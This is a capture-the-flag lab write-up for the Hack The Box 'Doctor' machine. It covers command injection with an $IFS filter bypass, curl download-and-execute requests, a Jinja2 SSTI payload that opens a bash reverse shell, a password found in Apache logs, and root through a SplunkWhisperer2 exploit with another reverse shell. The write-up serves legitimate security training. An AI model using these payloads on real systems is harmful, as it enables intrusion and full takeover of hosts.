# Doctor
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Directory & Virtual Host Enumeration | Identified open ports 22 (SSH), 80 (Apache), and 8089 (Splunk). Discovered a virtual host `doctors.htb` on port 80 which led to a login page with a registration feature. |
| 2 | (Web) | Server-Side Template Injection (SSTI) or Command Injection | Registered a user on `doctors.htb`. Discovered an SSTI vulnerability by injecting `{{ 7*7 }}` into a new post's title field and observing the output on the `/archive` page. This confirmed the use of a templating engine (Jinja2/Twig). As a secondary method, it was found that the application was vulnerable to command injection via the post title field by observing a `curl` user agent interacting with a local server and then using `$(whoami)` to confirm command execution. |
| 3 | web | Reverse Shell | **SSTI Method:** Used an SSTI payload `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"').read()}}` in the post title to get a reverse shell. \<br\> **Command Injection Method:** Used `curl` to download and execute a reverse shell script, also obtaining a shell. |
| 4 | web | Log File Analysis | Found that the user `web` was a member of the `adm` group, which has read access to log files. By examining the `/var/log/apache2/backup` file, a password `Guitar123` was discovered from a password reset attempt for the user `shaun`. |
| 5 | shaun | SSH Login | Used the password `Guitar123` to log in as the user `shaun` via SSH. |
| 6 | root | Splunk Privilege Escalation (CVE-2020-10118) | Identified a running Splunk service on port 8089 as `root`. Used the `shaun` credentials to log in. Found that the Splunk version (8.0.5) was vulnerable to a remote code execution exploit (SplunkWhisperer2). Executed the exploit to gain a root shell. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
|_http-server-header: Splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see the machine is running Ubuntu and has only three ports opened: 22, 80 and 8089.  
Port 8089 is password-protected, so, let's start digging into port 80.  
Here we can see a pretty standard site that actually leads nowhere.  
so let's start with directory enumeration:
```
/images               (Status: 301) [Size: 313] [--> http://10.10.10.209/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.209/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.209/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.209/fonts/]
/server-status        (Status: 403) [Size: 277]
```
Again not a lot to say.  
Let's look for files then:  
```
/images               (Status: 301) [Size: 313] [--> http://10.10.10.209/images/]
/about.html           (Status: 200) [Size: 19848]
/index.html           (Status: 200) [Size: 19848]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.209/js/]
/services.html        (Status: 200) [Size: 19848]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.209/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.209/fonts/]
/.                    (Status: 200) [Size: 19848]
/contact.html         (Status: 200) [Size: 19848]
/departments.html     (Status: 200) [Size: 19848]
```
All these pages redirects to index.html.  
In the index page we can see a mail address 'info@doctors.htb', so let's try to change the virtual host for this server.  
if we hit doctors.htb we can see a login page, here we have no credentials, but we can setup an account. Before doing so, let's quickly enumerate directories.  
```
/register             (Status: 200) [Size: 4493]
/account              (Status: 302) [Size: 251] [--> http://doctors.htb/login?next=%2Faccount]
/login                (Status: 200) [Size: 4204]
/logout               (Status: 302) [Size: 217] [--> http://doctors.htb/home]
/archive              (Status: 200) [Size: 101]
/home                 (Status: 302) [Size: 245] [--> http://doctors.htb/login?next=%2Fhome]
/.                    (Status: 302) [Size: 237] [--> http://doctors.htb/login?next=%2F]
/reset_password       (Status: 200) [Size: 3493]
```

## Foothold
### Method 1 - XSS RCE
After we setup an account we can see that not lot of functionalities are available in this site.  
Let's try to create a new post and see if the XSS works.  
As we can see if we type in comment our url, we get hit back by the curl user-agent:
```
[root@kali www ]$ nc -lvnp 80                              
listening on [any] 80 ...                                  
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.209] 43428                                                           
GET / HTTP/1.1                                             
Host: 10.10.14.6                                           
User-Agent: curl/7.68.0                                    
Accept: */*      
```
Now, we can assume that on the server side, we have a function similar to ```os.exec('curl [... SNIP ...]')``` now let's try to inject code here and see the response on our listening python http server:  
```
POST /post/new HTTP/1.1
Host: doctors.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://doctors.htb
Connection: close
Referer: http://doctors.htb/post/new
Cookie: session=.eJwlzjtuw0AMANG7bJ2CP5FcX0YgRQo2AiSAZFdB7m4FKWeq9zPW_ejzPm7P49UfY33UuA0HCm7VxZfcwBUlYisEtpSULWZmO0-rLHcF9mybM2thmtFihrpoqm6EEQ5oVWKRWgxCGlXGXOVtDRLTsd2JEVCRiKBoXJDX2ce_5i-389jX5_dnf10jIkkC3aWNK4Vpb-HZjH7JMMQbopzH7xuMYT5y.YnKHoQ.lTc8QwuXh-OJWjrjlo7CQF2LmaE
Upgrade-Insecure-Requests: 1

title=asd&content=http://10.10.14.6/$(whoami)&submit=Post
```
As we can see on our webserver we get command execution:  
```
10.10.10.209 - - [04/May/2022 16:28:41] code 404, message File not found
10.10.10.209 - - [04/May/2022 16:28:41] "GET /web HTTP/1.1" 404 -
```
Now let's try to trick this function to obtain a shell.  
As we can notice space characters are banned, instead we can use $IFS instead of spaces to trick the filter.  
However, if we try to upload our usual bash reverse shell we get an execution but the shell drops instantly.  
What we can try to do is to put the shell inside a file, add execution permission, and execute the file:
```
POST /post/new HTTP/1.1
Host: doctors.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://doctors.htb
Connection: close
Referer: http://doctors.htb/post/new
Cookie: session=.eJwlzjtuw0AMANG7bJ2CP5FcX0YgRQo2AiSAZFdB7m4FKWeq9zPW_ejzPm7P49UfY33UuA0HCm7VxZfcwBUlYisEtpSULWZmO0-rLHcF9mybM2thmtFihrpoqm6EEQ5oVWKRWgxCGlXGXOVtDRLTsd2JEVCRiKBoXJDX2ce_5i-389jX5_dnf10jIkkC3aWNK4Vpb-HZjH7JMMQbopzH7xuMYT5y.YnKQcA.butq5QzlK-cdRRfYVSm_EHiA3Tg
Upgrade-Insecure-Requests: 1

title=asd&content=http://10.10.14.6/$(/usr/bin/curl$IFS-o/tmp/shell2.sh$IFS'10.10.14.6/shell.sh')&submit=Post
```
Now, using curl, we downloaded the reverse shell (hosted on our python server) to the local box.  
Now let's add execution permissions:  
```
POST /post/new HTTP/1.1
Host: doctors.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: http://doctors.htb
Connection: close
Referer: http://doctors.htb/post/new
Cookie: session=.eJwlzjtuw0AMANG7bJ2CP5FcX0YgRQo2AiSAZFdB7m4FKWeq9zPW_ejzPm7P49UfY33UuA0HCm7VxZfcwBUlYisEtpSULWZmO0-rLHcF9mybM2thmtFihrpoqm6EEQ5oVWKRWgxCGlXGXOVtDRLTsd2JEVCRiKBoXJDX2ce_5i-389jX5_dnf10jIkkC3aWNK4Vpb-HZjH7JMMQbopzH7xuMYT5y.YnKQcA.butq5QzlK-cdRRfYVSm_EHiA3Tg
Upgrade-Insecure-Requests: 1

title=asd&content=http://10.10.14.6/$(chmod$IFS777$IFS/tmp/shell2.sh)&submit=Post
```
Now that permissions should be ok, we can run our shell:  
```
POST /post/new HTTP/1.1
Host: doctors.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://doctors.htb
Connection: close
Referer: http://doctors.htb/post/new
Cookie: session=.eJwlzjtuw0AMANG7bJ2CP5FcX0YgRQo2AiSAZFdB7m4FKWeq9zPW_ejzPm7P49UfY33UuA0HCm7VxZfcwBUlYisEtpSULWZmO0-rLHcF9mybM2thmtFihrpoqm6EEQ5oVWKRWgxCGlXGXOVtDRLTsd2JEVCRiKBoXJDX2ce_5i-389jX5_dnf10jIkkC3aWNK4Vpb-HZjH7JMMQbopzH7xuMYT5y.YnKQcA.butq5QzlK-cdRRfYVSm_EHiA3Tg
Upgrade-Insecure-Requests: 1

title=asd&content=http://10.10.14.6/$(bash$IFS/tmp/shell2.sh)&submit=Post
```
And we got a reverse shell as web user:  
```
[root@kali Doctor ]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.209] 53020
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$
```


### Method 2 - SSTI
As we can see the webserver is running with flask.  
If we go to [book.hacktricks.xyz for flask](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) we can see a really big hint on the top of the page:  
```
Probably if you are playing a CTF a Flask application will be related to STTI
```
Se we can go to [SSTI Page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and read some docs.
As documented there, we can see that the attack is structured in three main phases: Detect, Identify and Exploit.  
So first of all, we need to identify SSTI.  
As we may have notice, when we insert an article, titles are shown into ```/archive```, so we can try to inject like ```{{ 7*7 }}``` and see what happens.  
```
<channel>
 	<title>Archive</title>
 	<item><title>49</title></item>
</channel>
```
so we detected that the site is affected by an SSTI vulnerability.  
Once we have detected the template injection potential, the next step is to identify the template engine.
Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. We can follow the tree on [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), here, fuzzing the template engine we can discover what kind of exploit we can run against the application.
Following the tree and testing all payloads, we can discover that in the backend the application is running Jinja2/twig application.  
Now we can go to the exploit section, test all the available exploit for jinja2+python
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"').read()}}
```
We can upload our payload in title field, go to archive, and on our listener we can see:
```
root@kali:~/Documents/HTB/Boxes/Doctor# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.209] 57964
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$
```
And we got a reverse shell as web user.

## User
Now that we have a shell as user web, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that web is part of adm group:  
```
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
User & Groups: uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```
And hence can read log files:  
```
╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                                                                                                                      
-rw-r----- 1 root adm 92 Sep 28  2020 /var/log/cups/error_log.1                                                                                                                                                                              
-rw-r----- 1 root adm 4736 Mai  4 10:12 /var/log/cups/access_log.1                                                                                                                                                                           
-rw-r----- 1 root adm 202 Sep 17  2020 /var/log/cups/access_log.7.gz                                                                                                                                                                         
-rw-r----- 1 root adm 256 Sep 23  2020 /var/log/cups/access_log.3.gz                                                  
-rw-r----- 1 root adm 0 Mai  4 10:12 /var/log/cups/error_log                                                          
-rw-r----- 1 root adm 267 Sep 23  2020 /var/log/cups/access_log.2.gz
-rw-r----- 1 root adm 118 Sep 15  2020 /var/log/cups/error_log.2.gz                                                   
-rw-r----- 1 root adm 109 Aug 13  2020 /var/log/cups/error_log.3.gz                                                   
-rw-r----- 1 root adm 0 Mai  4 10:12 /var/log/cups/access_log                                                         
-rw-r----- 1 root adm 204 Sep 18  2020 /var/log/cups/access_log.6.gz                                                  
-rw-r----- 1 root adm 190 Sep 19  2020 /var/log/cups/access_log.5.gz                                                  
-rw-r----- 1 root adm 219 Sep 22  2020 /var/log/cups/access_log.4.gz                                                  
-rw-r----- 1 root adm 476 Sep  7  2020 /var/log/apache2/error.log.10.gz     
-rw-r----- 1 root adm 460 Sep 15  2020 /var/log/apache2/error.log.9.gz                                                
-rw-r----- 1 root adm 270 Aug 18  2020 /var/log/apache2/access.log.11.gz                                              
-rw-r----- 1 root adm 35844025 Mai  4 16:50 /var/log/apache2/error.log                                                
-rw-r----- 1 root adm 21578 Sep 17  2020 /var/log/apache2/backup
-rw-r----- 1 root adm 1493 Sep 23  2020 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 424 Sep 18  2020 /var/log/apache2/error.log.6.gz
-rw-r----- 1 root adm 3551 Sep 28  2020 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 6626 Sep 28  2020 /var/log/apache2/access.log.1                                                 
-rw-r----- 1 root adm 230 Aug 21  2020 /var/log/apache2/error.log.14.gz                                               
-rw-r----- 1 root adm 846 Sep 22  2020 /var/log/apache2/error.log.3.gz
-rw-r----- 1 root adm 352 Sep 19  2020 /var/log/apache2/error.log.5.gz                                                
-rw-r----- 1 root adm 300825108 Mai  4 16:54 /var/log/apache2/access.log                                              
-rw-r----- 1 root adm 384 Sep 14  2020 /var/log/apache2/access.log.6.gz                   
-rw-r----- 1 root adm 3018 Sep  7  2020 /var/log/apache2/access.log.7.gz                                              
-rw-r----- 1 root adm 1338 Sep  6  2020 /var/log/apache2/access.log.8.gz                                              
-rw-r----- 1 root adm 428 Sep 17  2020 /var/log/apache2/error.log.7.gz                                                
-rw-r----- 1 root adm 1266 Sep  5  2020 /var/log/apache2/access.log.9.gz                                              
-rw-r----- 1 root adm 655 Sep 22  2020 /var/log/apache2/error.log.4.gz                                                
-rw-r----- 1 root adm 629 Sep 16  2020 /var/log/apache2/error.log.8.gz                                                
-rw-r----- 1 root adm 3951 Sep 22  2020 /var/log/apache2/access.log.3.gz                                              
-rw-r----- 1 root adm 1341 Sep 19  2020 /var/log/apache2/access.log.4.gz                                              
-rw-r----- 1 root adm 1092 Sep 23  2020 /var/log/apache2/error.log.2.gz                                               
-rw-r----- 1 root adm 341 Sep  5  2020 /var/log/apache2/error.log.13.gz                                               
-rw-r----- 1 root adm 680 Sep  5  2020 /var/log/apache2/error.log.12.gz                                               
-rw-r----- 1 root adm 323 Aug 21  2020 /var/log/apache2/access.log.10.gz                                              
-rw-r----- 1 root adm 537 Sep  6  2020 /var/log/apache2/error.log.11.gz                                               
-rw-r----- 1 root adm 664054 Sep 15  2020 /var/log/apache2/access.log.5.gz                                            
-rw-r----- 1 root adm 320 Sep  6  2020 /var/log/apt/term.log.1.gz                                                     
-rw-r----- 1 root adm 2932 Aug 13  2020 /var/log/apt/term.log.2.gz                                                    
-rw-r----- 1 root adm 0 Sep  7  2020 /var/log/apt/term.log
```
Given this capability, let's try to look inside ```/var/log``` directory to see if we can find any sensitive information in here.  
After few grep we can came up with:  
```
web@doctor:/var/log/apache2$ grep -ri pass * | grep -v error.log | grep -v gobuster
[... SNIP ...]
backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
[... SNIP ...]
```
we can see that this backup file is not pretty standard, so we sould be able to see this even without grepping for 'pass':
```
web@doctor:/var/log/apache2$ cat backup | grep -vi gobuster | awk '{print $7}' | sort | uniq -c
     45 /
      1 12.1.2\n"
      6 400
      1 /evox/about
      5 /favicon.ico
      2 /.git/HEAD
      2 /HNAP1
     23 /home
      2 /icons/ubuntu-logo.png
      3 /login
      1 /nmaplowercheck1599231606
      1 /nmaplowercheck1599231646
      2 /post/new
      3 /register
      1 /reset_password?email=Guitar123"
      2 /robots.txt
      1 /sdk
     17 /static/main.css
     17 /static/profile_pics/default.gif
```
Now that we have a password let's try to switch user to the only user available in the box:  
```
web@doctor:/var/log/apache2$ su - shaun
Password:
shaun@doctor:~$
```
And we got user

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that the splunk service we initially discovered is running as root:  
```
╔════════════════════════════════════════════════╗              
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════          
 ╚════════════════════════════════════════════════╝                                                                                                                                                                 
╔══════════╣ Cleaned processes                                                                                        
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
[... SNIP ...]
root        1138  0.0  2.1 257468 87936 ?        Sl   Mai04   0:46 splunkd -p 8089 start
[... SNIP ...]
```
So, let's see if we can login to splunk using the shaun credentials.  
Once we are in into splunk we can checkout the version ```Splunk build: 8.0.5```. Now searching online for this version's exploit we can came across this [GitHub page of splunkWhirperer2 RCE](https://github.com/cnotin/SplunkWhisperer2) essentially we would only need to run the python script and hopefully we will gain root access to the box:  
```
[root@kali PySplunkWhisperer2 (master)]$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --lhost 10.10.14.6 --lport 9001 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.6/9002 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpi0qhi5lc.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.6:9001/
10.10.10.209 - - [06/May/2022 11:05:06] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup                                  
```
And on our listener we get a shell as root:
```
root@kali:~/Documents/HTB/Boxes/Doctor# nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.209] 49738
bash: cannot set terminal process group (1140): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id
uid=0(root) gid=0(root) groups=0(root)
```
